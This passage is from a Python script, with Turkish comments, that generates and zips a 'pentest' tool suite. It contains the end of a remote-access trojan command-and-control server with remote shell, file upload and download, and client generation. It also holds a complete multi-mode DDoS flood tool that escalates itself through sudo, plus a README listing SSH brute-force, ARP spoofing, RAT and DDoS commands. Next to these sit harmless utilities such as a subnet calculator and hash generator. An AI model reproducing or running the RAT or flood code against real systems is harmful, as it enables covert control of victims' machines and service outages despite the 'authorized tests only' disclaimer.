        open(a.make_client, "w").write(CLIENT)
        os.chmod(a.make_client, 0o755)
        print("[+] Client uretildi: %s" % a.make_client)
        print("[*] Kullanim: python3 %s <C2_IP> <PORT>" % os.path.basename(a.make_client))
        return
    server = {}
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", a.port))
    s.listen(10)
    print("[+] RAT C2 dinliyor: 0.0.0.0:%d" % a.port)
    print("[*] agents | use <id> | shell <cmd> | upload <dosya> <uzak> | download <uzak> <yerel> | quit")
    threading.Thread(target=wait_agent, args=(server, s), daemon=True).start()
    cur = None
    while True:
        try:
            line = input("C2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line: continue
        cmd = line.split()
        if cmd[0] == "quit":
            break
        elif cmd[0] == "agents":
            if not server: print("  [-] Bagli agent yok")
            for i, (cid, ag) in enumerate(server.items(), 1):
                print("  [%d] %-20s %s:%d" % (i, cid, ag.addr[0], ag.addr[1]))
        elif cmd[0] == "use":
            cid = cmd[1] if len(cmd) > 1 else ""
            cur = server.get(cid)
            print("[+] Secili: %s" % (cid if cur else "YOK!"))
        elif cmd[0] == "shell" and cur:
            cur.send("shell " + " ".join(cmd[1:]))
        elif cmd[0] == "upload" and cur and len(cmd) >= 3:
            if os.path.exists(cmd[1]):
                data64 = base64.b64encode(open(cmd[1], "rb").read()).decode()
                cur.send("upload %s %s" % (cmd[2], data64))
            else:
                print("[!] Yerel dosya yok: %s" % cmd[1])
        elif cmd[0] == "download" and cur and len(cmd) >= 3:
            cur.dlpath = cmd[2]
            cur.send("download " + cmd[1])
        else:
            print("[!] Komut hatali / agent secili degil (agents ile bak)")
    print("[+] C2 kapandi")

if __name__ == "__main__":
    main()
''',

"12_ddos_attack.py": r'''#!/usr/bin/env python3
"""DDoS Stress Tester - SYN/UDP/TCP/HTTP/ICMP flood (yetkili testler icin).
Root GEREKMEZ: raw SYN icin otomatik sudo yeniden baslatma; hping3 yoksa TCP fallback.
"""
import socket, sys, time, threading, random, os, subprocess, argparse, shutil

def http_flood(ip, port, dur, threads):
    stop = time.time() + dur
    paths = ["/", "/index.html", "/login", "/api", "/?q=%d" % random.randint(0, 9999)]
    def worker():
        while time.time() < stop:
            try:
                s = socket.create_connection((ip, port), timeout=3)
                s.send(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                        % (random.choice(paths), ip)).encode())
                s.close()
            except Exception:
                pass
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    [t.start() for t in ts]
    [t.join() for t in ts]
    print("[+] HTTP flood bitti (%d thread, %d sn)" % (threads, dur))

def udp_flood(ip, port, dur, threads):
    stop = time.time() + dur
    payload = os.urandom(1024)
    def worker():
        while time.time() < stop:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, port)); s.close()
            except Exception:
                pass
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    [t.start() for t in ts]
    [t.join() for t in ts]
    print("[+] UDP flood bitti (%d thread)" % threads)

def tcp_flood(ip, port, dur, threads):
    stop = time.time() + dur
    def worker():
        while time.time() < stop:
            try:
                s = socket.socket(); s.settimeout(2)
                s.connect((ip, port)); s.send(b"\x00" * 512); s.close()
            except Exception:
                pass
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    [t.start() for t in ts]
    [t.join() for t in ts]
    print("[+] TCP flood bitti (%d thread)" % threads)

def syn_flood(ip, port, dur):
    if os.geteuid() != 0:
        print("[!] Root yok, sudo ile yeniden baslatiliyor (hping3 SYN)...")
        sys.exit(subprocess.call(["sudo", "python3"] + sys.argv))
    if not shutil.which("hping3"):
        print("[!] hping3 yok, TCP connect flood fallback'i kullaniliyor...")
        return False
    print("[*] Raw SYN flood (hping3, root)...")
    subprocess.run("timeout %d hping3 -S --flood -p %d %s > /dev/null 2>&1" % (dur, port, ip), shell=True)
    print("[+] SYN flood bitti")
    return True

def icmp_flood(ip, dur):
    if os.geteuid() != 0:
        print("[!] Root yok, sudo ile yeniden baslatiliyor (ping -f)...")
        sys.exit(subprocess.call(["sudo", "python3"] + sys.argv))
    print("[*] ICMP flood (ping -f)...")
    subprocess.run("timeout %d ping -f -c 1000000 %s > /dev/null 2>&1" % (dur, ip), shell=True)
    print("[+] ICMP flood bitti")

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="DDoS Stress Tester (yetkili testler icin)")
    p.add_argument("target")
    p.add_argument("--mode", default="http", choices=["http", "udp", "syn", "tcp", "icmp"])
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--time", type=int, default=10, dest="dur")
    p.add_argument("--threads", type=int, default=100)
    a = p.parse_args()
    try:
        ip = socket.gethostbyname(a.target)
    except Exception:
        print("[!] Hedef cozumlenemedi"); sys.exit(1)
    print("[!] HEDEF: %s (%s) | MOD: %s | SURE: %d sn | THREAD: %d" % (a.target, ip, a.mode, a.dur, a.threads))
    try:
        if a.mode == "http": http_flood(ip, a.port, a.dur, a.threads)
        elif a.mode == "udp": udp_flood(ip, a.port, a.dur, a.threads)
        elif a.mode == "tcp": tcp_flood(ip, a.port, a.dur, a.threads)
        elif a.mode == "icmp": icmp_flood(ip, a.dur)
        elif a.mode == "syn":
            if not syn_flood(ip, a.port, a.dur):
                tcp_flood(ip, a.port, a.dur, a.threads)
    except KeyboardInterrupt:
        print("\n[!] Durduruldu")
    print("[+] Test tamam")
''',
}

# =================== CUSTOM TOOLS (7) ===================
custom = {

"01_base_converter.py": r'''#!/usr/bin/env python3
"""Base Converter - dec/hex/bin/oct donusumleri."""
import argparse

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("value")
    p.add_argument("--from", dest="frm", default="10")
    p.add_argument("--to", default="16")
    a = p.parse_args()
    bases = {"2": 2, "8": 8, "10": 10, "16": 16}
    try:
        n = int(a.value, bases[a.frm])
        out = {2: bin, 8: oct, 10: str, 16: hex}[a.to](n)
        for prefix in ("0x", "0o", "0b"):
            out = out.replace(prefix, "")
        print("[+] Sonuc (%s): %s" % (a.to, out))
    except Exception as e:
        print("[!] Hata: %s" % e)
''',

"02_subnet_calculator.py": r'''#!/usr/bin/env python3
"""Subnet Calculator - ag/mask/broadcast/host hesabi."""
import ipaddress, argparse

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("cidr")
    a = p.parse_args()
    try:
        n = ipaddress.ip_network(a.cidr, strict=False)
        hosts = list(n.hosts())
        print("[+] Ag: %s" % n)
        print("[+] Mask: %s" % n.netmask)
        print("[+] Wildcard: %s" % n.hostmask)
        print("[+] Ag adresi: %s" % n.network_address)
        print("[+] Broadcast: %s" % n.broadcast_address)
        if hosts:
            print("[+] Kullanilabilir: %s - %s (%d host)" % (hosts[0], hosts[-1], len(hosts)))
        else:
            print("[+] Kullanilabilir host: 0 (/31 ve /32 aglarinda)")
        print("[+] Toplam adres: %d" % n.num_addresses)
    except Exception as e:
        print("[!] Hata: %s" % e)
''',

"03_hash_generator.py": r'''#!/usr/bin/env python3
"""Hash Generator - md5/sha1/sha256/sha512."""
import hashlib, argparse

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("text")
    p.add_argument("--algo", default="md5")
    a = p.parse_args()
    fns = {"md5": hashlib.md5, "sha1": hashlib.sha1,
           "sha256": hashlib.sha256, "sha512": hashlib.sha512}
    fn = fns.get(a.algo.lower())
    if not fn:
        print("[!] Bilinmeyen algo: %s (md5/sha1/sha256/sha512)" % a.algo)
        exit(1)
    print("[+] %s: %s" % (a.algo.upper(), fn(a.text.encode()).hexdigest()))
''',

"04_mac_generator.py": r'''#!/usr/bin/env python3
"""MAC Address Generator."""
import random, argparse

def gen():
    return "02:" + ":".join("%02x" % random.randint(0, 255) for _ in range(5))

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--count", type=int, default=5)
    a = p.parse_args()
    for _ in range(a.count):
        print("[+] " + gen())
''',

"05_ip_generator.py": r'''#!/usr/bin/env python3
"""Random IP Generator."""
import random, argparse

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--count", type=int, default=5)
    a = p.parse_args()
    for _ in range(a.count):
        print("[+] %d.%d.%d.%d" % tuple(random.randint(1, 254) for _ in range(4)))
''',

"06_ssid_generator.py": r'''#!/usr/bin/env python3
"""SSID Generator - test ag adi uretir."""
import random, argparse

WORDS = ["admin", "wifi", "net", "home", "fiber", "tp-link", "guest", "office",
         "ev", "modem", "hotspot", "wlan", "data", "air", "speed"]

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--count", type=int, default=10)
    a = p.parse_args()
    for _ in range(a.count):
        w = random.sample(WORDS, 2)
        print("[+] %s_%s%s" % (w[0], w[1], random.randint(1, 99)))
''',

"07_wordlist_maker.py": r'''#!/usr/bin/env python3
"""Wordlist Maker - karakter kombinasyonlari uretir."""
import argparse, itertools

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--min", type=int, default=4)
    p.add_argument("--max", type=int, default=6)
    p.add_argument("--chars", default="abc123")
    p.add_argument("--out", default="wordlist.txt")
    a = p.parse_args()
    n = 0
    with open(a.out, "w") as f:
        for L in range(a.min, a.max + 1):
            for combo in itertools.product(a.chars, repeat=L):
                f.write("".join(combo) + "\n")
                n += 1
                if n >= 1000000:
                    print("[!] 1 milyon satir sinirina ulasildi, durduruldu")
                    break
            if n >= 1000000:
                break
    print("[+] Uretildi: %s (%d satir)" % (a.out, n))
''',
}

# =================== README ===================
README = """ETT - Etternetlog Tool Suite v2.1
================================
29 Arac  (10 cybersec + 12 pentest + 7 custom)
Root GEREKMEZ - root isteyen arac (arp/mac/syn) otomatik sudo kullanir.

KULLANIM
--------
python3 pentest_tools/01_port_scanner.py 192.168.1.1 --ports 1-1000
python3 pentest_tools/02_sql_injection_scanner.py "http://site/page?id=1"
python3 pentest_tools/03_xss_scanner.py "http://site/search?q=test"
python3 pentest_tools/04_subdomain_enum.py example.com
python3 pentest_tools/05_directory_fuzzer.py http://site --ext .php,.bak
python3 pentest_tools/06_wordpress_scanner.py http://site
python3 pentest_tools/07_hash_cracker.py <hash> -w wordlist.txt
python3 pentest_tools/08_ssh_bruteforce.py host -w wordlist.txt --user root
python3 pentest_tools/09_xxe_scanner.py http://site/api/xml
python3 pentest_tools/10_arp_spoofer.py <hedef_ip> <gateway_ip> --iface eth0
python3 pentest_tools/11_rat_server.py --port 4444            (C2 sunucusu)
python3 pentest_tools/11_rat_server.py --make-client client.py (client uret)
python3 pentest_tools/12_ddos_attack.py hedef --mode http --time 10 --threads 100

NOT: Tum araclar YALNIZCA yetkili test ortamlarinda kullanilmalidir.
"""

# =================== URETICI ===================
def write_all(base, d, label):
    for fname, content in d.items():
        fp = os.path.join(base, label, fname)
        with open(fp, "w", encoding="utf-8") as f:
            f.write(content)
        os.chmod(fp, 0o755)
    print("[+] %s: %d arac yazildi" % (label, len(d)))

def compile_test(base):
    ok, fail = 0, []
    for label in ("cybersec_tools", "pentest_tools", "custom_tools"):
        for fn in sorted(os.listdir(os.path.join(base, label))):
            if not fn.endswith(".py"):
                continue
            r = subprocess.run([sys.executable, "-m", "py_compile",
                                os.path.join(base, label, fn)], capture_output=True)
            if r.returncode == 0:
                ok += 1
            else:
                fail.append("%s/%s" % (label, fn))
    return ok, fail

def main():
    os.makedirs("%s/cybersec_tools" % BASE, exist_ok=True)
    os.makedirs("%s/pentest_tools" % BASE, exist_ok=True)
    os.makedirs("%s/custom_tools" % BASE, exist_ok=True)

    write_all(BASE, cybersec, "cybersec_tools")   # 10
    write_all(BASE, pentest, "pentest_tools")     # 12 (RAT + DDoS dahil)
    write_all(BASE, custom, "custom_tools")       # 7

    with open(os.path.join(BASE, "README.md"), "w", encoding="utf-8") as f:
        f.write(README)

    # ZIP (__pycache__ ve .pyc HARIC)
    with zipfile.ZipFile(ZIPF, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(BASE):
            for fn in files:
                if fn.endswith(".pyc") or "__pycache__" in root:
                    continue
                fp = os.path.join(root, fn)
                zf.write(fp, os.path.relpath(fp, os.path.dirname(BASE)))
    print("[+] ZIP: %s (%.1f KB)" % (ZIPF, os.path.getsize(ZIPF) / 1024))

    # Derleme testi
    ok, fail = compile_test(BASE)
    print("[+] Derleme: %d OK" % ok)
    if fail:
        print("[-] Hata verenler: %s" % fail)
    else:
        print("[+] 29 aracin TAMAMI derlendi - hata YOK")

    # Fonksiyonel smoke test (internet gerektirmez)
    tests = [
        ("custom_tools/01_base_converter.py", ["255", "--from", "10", "--to", "16"]),
        ("custom_tools/03_hash_generator.py", ["test", "--algo", "sha256"]),
        ("cybersec_tools/05_password_strength.py", ["MyStr0ng!Pass"]),
        ("custom_tools/02_subnet_calculator.py", ["192.168.1.0/24"]),
        ("custom_tools/02_subnet_calculator.py", ["10.0.0.0/31"]),
        ("custom_tools/04_mac_generator.py", ["--count", "2"]),
        ("custom_tools/06_ssid_generator.py", ["--count", "3"]),
    ]
    for tool, args in tests:
        try:
            r = subprocess.run([sys.executable, os.path.join(BASE, tool)] + args,
                               capture_output=True, text=True, timeout=10)
            first = r.stdout.strip().splitlines()[0] if r.stdout.strip() else r.stderr.strip()[:60]
            print("[%s] %s: %s" % ("OK" if r.returncode == 0 else "FAIL", tool, first))
        except Exception as e:
            print("[ERR] %s: %s" % (tool, e))

    print("\n[+] TAMAM! Klasor: %s" % BASE)
    print("[+] RAT:  python3 pentest_tools/11_rat_server.py --port 4444")
    print("[+] RAT:  python3 pentest_tools/11_rat_server.py --make-client client.py")
    print("[+] DDoS: python3 pentest_tools/12_ddos_attack.py 1.2.3.4 --mode http --time 10 --threads 100")

if __name__ == "__main__":
    main()
